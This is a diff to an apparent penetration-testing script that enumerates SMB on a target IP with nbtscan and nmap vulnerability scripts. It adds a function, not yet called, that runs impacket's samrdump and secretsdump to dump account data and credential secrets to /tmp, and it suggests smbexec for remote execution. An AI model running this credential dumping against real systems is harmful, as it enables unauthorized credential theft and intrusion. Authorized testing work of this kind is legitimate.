@@ -9,6 +9,18 @@ if len(sys.argv) != 2:
 ip_address = str(sys.argv[1])
 NSEscripts = ["smb-vuln-conficker.nse", "smb-vuln-cve2009-3103.nse", "smb-vuln-ms06-025.nse", "smb-vuln-ms07-029.nse", "smb-vuln-ms08-067.nse", "smb-vuln-ms10-054.nse", "smb-vuln-ms10-061.nse", "smb-os-discovery"]
 
+def impacket(ip_address):
+#In order for any of these to work, you should likely create an alias for samrdump/secretsdump 
+	print "[*] Dumping Security Account Manager if possible..."
+	print "[!][!] You should really consider running smbexec.py against " + ip_address + " if you want to be cool...[!][!]"
+	samrdump = "samrdump.py " + ip_address + " > /tmp/%s/samrdump.txt" % (ip_address)
+	secretsdump = "secretsdump.py " + ip_address + " > /tmp/%s/secrets.txt" % (ip_address)
+	callsamr = subprocess.Popen(samrdump, stdout=subprocess.PIPE, shell=True)
+	callsamr.wait()	
+	print "[*] Dumping secrets if possible..."
+	callsecrets = subprocess.Popen(secretsdump, stdout=subprocess.PIPE, shell=True)
+	callsecrets.wait()
+	
 def nbtscan(ip_address):
 	print "[*] Grabbing generic data from " + ip_address
 	smbscan = "nbtscan -r %s > /tmp/%s/nbtscan" % (ip_address, ip_address)
@@ -54,6 +66,7 @@ def nmap(ip_address):
 		elif ("smb-os-discovery" in script):
 			smbnse = "nmap -sTU -pT:139,445,U:139 --script=smb-os-discovery %s -oA /tmp/%s/smb-os-discovery" % (ip_address, ip_address)
 			subprocess.call(smbnse, shell=True)
+	#impacket(ip_address)
 
 def main():
 	nbtscan(ip_address)
